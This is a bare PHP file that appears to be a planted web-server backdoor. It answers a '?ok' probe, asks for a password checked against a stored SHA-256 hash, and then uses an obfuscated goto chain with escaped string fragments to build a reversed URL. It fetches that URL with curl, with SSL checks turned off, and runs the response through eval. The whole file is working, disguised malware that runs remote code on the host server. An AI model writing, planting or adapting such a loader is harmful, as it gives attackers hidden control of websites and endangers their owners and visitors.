<?php ?><?php error_reporting(0); if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
if (function_exists('session_start')) { session_start(); if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } if (!$_SESSION['secretyt']) { if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == '6e4d5228cf850d984a9159d8a6957eb2252f871ba2bdab40c199c983ea7e93d1') {
      $_SESSION['secretyt'] = true; } else { die('<html> <head> <meta charset="utf-8"> <title></title> <style type="text/css"> body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; } </style> </head> <body> <form action="" method="post" accept-charset="utf-8"> <input type="password" name="pwdyt" value="" placeholder="passwd"> <input type="submit" name="submit" value="submit"> </form> </body> </html>'); } } }
?>
<?php
goto sxpzC; Ku22d: $SS8Fu .= "\x2e\x35\57"; goto hFeQO; niJPu: $SS8Fu .= "\x6f\164\x2e\x31\60"; goto cNjvp; Wop7u: $SS8Fu .= "\x6d\141\x64\x2f\160"; goto niJPu; sSAji: $SS8Fu .= "\164\170\164"; goto Ku22d; sxpzC: $SS8Fu = ''; goto sSAji; Pm8C0: $SS8Fu .= "\144\x2f\57"; goto X2745; hFeQO: $SS8Fu .= "\144\x6c\157\x2f\x61"; goto Wop7u; X2745: $SS8Fu .= "\x3a\x73\160\x74"; goto T5ftU; cNjvp: $SS8Fu .= "\x61\x6d\x61"; goto Pm8C0; T5ftU: $SS8Fu .= "\x74\x68"; goto zWfEB; zWfEB: eval("\x3f\76" . tW2KX(strrev($SS8Fu))); goto gPzcS; gPzcS: function TW2KX($V1_rw = '') { goto uhE6D; Q510J: curl_setopt($xM315, CURLOPT_URL, $V1_rw); goto VN0qi; Mj0OL: curl_setopt($xM315, CURLOPT_RETURNTRANSFER, true); goto mLL0A; mLL0A: curl_setopt($xM315, CURLOPT_TIMEOUT, 500); goto i9wy_; cm3pV: curl_close($xM315); goto C3tjU; p9vG6: curl_setopt($xM315, CURLOPT_SSL_VERIFYHOST, false); goto Q510J; C3tjU: return $tvmad; goto ueEhW; uhE6D: $xM315 = curl_init(); goto Mj0OL; i9wy_: curl_setopt($xM315, CURLOPT_SSL_VERIFYPEER, false); goto p9vG6; VN0qi: $tvmad = curl_exec($xM315); goto cm3pV; ueEhW: }